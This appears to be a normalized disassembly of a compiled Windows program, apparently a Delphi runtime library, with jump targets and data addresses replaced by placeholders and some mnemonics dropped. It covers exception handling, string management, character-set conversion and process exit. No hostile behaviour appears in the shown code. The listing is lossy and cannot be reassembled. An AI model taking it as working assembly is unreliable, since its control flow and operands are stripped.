mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403124
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_403588
jmp edx
sub_403974
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027e8
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403ad4
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403afc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403b42
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403b5c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403ba2
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403bfc
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405a5c
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c20
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405a5c
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c48
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c6c
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403cc8
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403cf8
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_401254
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_40120c
push eax
call sub_40122c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_40120c
push eax
call sub_40122c
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403d84
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403c6c
call sub_403cf8
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403afc
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403ad4
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405528
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403cc8
push eax
call sub_40126c
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403e74
push ebp
mov ebp esp
call sub_403060
push ebp
xor ecx ecx
push r-xdata
mov edx [ fs : ecx ]
push edx
mov [ fs : ecx ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
call sub_402704
pop edx
pop eax
call edx
xor edx edx
pop ecx
mov [ fs : edx ] ecx
pop ecx
pop ebp
pop ebp
retn 0x4
sub_403eac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0x8
call sub_4026e4
mov [ eax ] edi
mov edx [ ebp + 0x10 ]
mov [ eax + 0x4 ] edx
mov [ rw-data ] 0x1
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax sub_403e74
push eax
push esi
push ebx
call sub_40123c
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_403ef8
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_402704
pop eax
sub_403f1c
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402704
sub_403f4c
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_403fbc
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028e0
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402704
sub_403f90
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402704
sub_403fbc
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026e4
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_403fe8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_403fbc
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403ef8
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028e0
sub_404018
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_404038
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_404054
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403ef8
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_404544
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404018
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_404018
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404544
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_403fe8
jmp r-xdata
sub_4040f0
xor ecx ecx
test edx edx
je r-xdata
jmp sub_403fe8
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_404120
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404054
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404168
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_403fe8
not ecx
sub_404194
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028e0
pop ebx
retn
mov ecx ebx
sub_4041c0
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403f4c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_404544
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_404544
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028e0
pop edi
pop esi
pop ebx
retn
sub_404204
test edx edx
je r-xdata
mov edx ecx
jmp sub_403f4c
test ecx ecx
je sub_403f4c
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_4041c0
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_403fbc
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028e0
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028e0
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403f4c
pop edx
pop eax
jmp sub_4041c0
call sub_403f4c
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_404278
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_403fbc
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_404544
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028e0
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403f4c
dec [ edx - 0x8 ]
sub_404304
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_4043c4
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_403fbc
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028e0
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_402704
sub_404418
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403ef8
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_403fe8
jmp r-xdata
pop ebx
retn 0x4
sub_404458
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_4043c4#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028e0
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_404544
mov edi ecx
sub_4044a0
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_404544
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028e0
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028e0
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_4044fc
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_404544
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403ef8
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_403fbc
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_402724
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028e0
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_4045f0
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404614
test edx edx
je sub_4045d8
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_4045d8
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402840
retn
sub_404638
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_4045d8
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_404820
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404038
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_404038
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404820
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_4046c4
jmp r-xdata
sub_4046c4
test ecx ecx
je sub_4045d8
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402840
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_4046e8
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4046c4
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404750
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_4047d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_404744
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_4046c4
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_404820
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_4045c8
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4045b0
mov ebx eax
mov eax [ edi ]
call sub_404744
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028e0
mov eax esi
sub_404864
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404894
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404894
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404894
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404864
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402840
sub_404934
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404980
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404980
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403f1c
jmp r-xdata
call sub_403ef8
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_4045f0
jmp r-xdata
call sub_4045d8
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404968
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404980
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404934
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_405598
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_404eb8
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402840
sub_404a90
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028e0
mov edx [ eax + esi ]
add eax ebx
call sub_403f4c
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404614
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404a78
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028e0
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404bac
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404a90
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4055b0
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_404ef4
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402840
sub_404bac
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_403f4c
